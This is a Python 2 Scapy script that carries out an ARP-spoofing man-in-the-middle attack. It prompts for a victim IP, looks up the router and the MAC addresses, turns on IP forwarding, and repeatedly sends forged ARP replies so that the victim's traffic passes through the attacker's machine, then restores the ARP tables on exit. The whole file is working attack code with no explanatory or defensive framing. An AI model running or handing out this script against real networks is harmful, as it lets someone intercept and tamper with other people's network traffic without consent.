from scapy.all import *
import os
import sys
from netifaces import * # Using for finding the router's IP Address

def find_mac_addr(ip, name):
	try :
		mac = open("/proc/net/arp", "r").read().split(ip+" ")[1]
		mac = mac.split()[2]
	except IndexError:
		print "Can't find " + name + "'s MAC address"
		exit(1)
	else:
		return mac

def arp_poison(v_ip, r_ip, v_mac, r_mac):
	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = v_mac))
	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = r_mac))

def arp_restore(v_ip, r_ip, v_mac, r_mac):
	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = "ff:ff:ff:ff:ff:ff"))
	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = "ff:ff:ff:ff:ff:ff"))

if os.getuid() != 0 :
	sys.exit("[!] please run as root")

victim_IP = raw_input("> Input victim IP address : ")
attacker_IP = os.popen("ifconfig").read().split("inet addr:")[1].strip().split(' ')[0]
router_IP = gateways()['default'][AF_INET][0]
victim_MAC = find_mac_addr(victim_IP, "victim")
attacker_MAC = os.popen("ifconfig").read().split("HWaddr")[1].strip().split(' ')[0]
router_MAC = find_mac_addr(router_IP, "router")

print "--------------------------------------------------------"
print "[*] victim IP address     	: " + victim_IP
print "[*] victim MAC address    	: " + victim_MAC
print "[*] attacker IP address   	: " + attacker_IP
print "[*] attkacer MAC address 	: " + attacker_MAC
print "[*] router IP address 		: " + router_IP
print "[*] router Mac address  	: " + router_MAC
print "--------------------------------------------------------"
print "[*] Set IP forwarding enabled"
print "--------------------------------------------------------"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def arp_monitor_callback(pkt):
	if ARP in pkt :
		arp_poison(victim_IP, router_IP, victim_MAC, router_MAC)
		print "ARP Poison"
	else :
		if pkt[IP].src == victim_IP:
			print "SRC : victim_MAC"
		if pkt[IP].dst == victim_IP:
			print "DST : victim_MAC"

while True:
	try:
		sniff(prn=arp_monitor_callback, filter="host "+victim_IP+" or host "+router_IP, count=1)
	except KeyboardInterrupt as err:	
		print "--------------------------------------------------------"
		print "[*] Set IP forwarding disabled"
		print "--------------------------------------------------------"
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		arp_restore(victim_IP, router_IP, victim_MAC, router_MAC)
		sys.exit("[!] Exit")
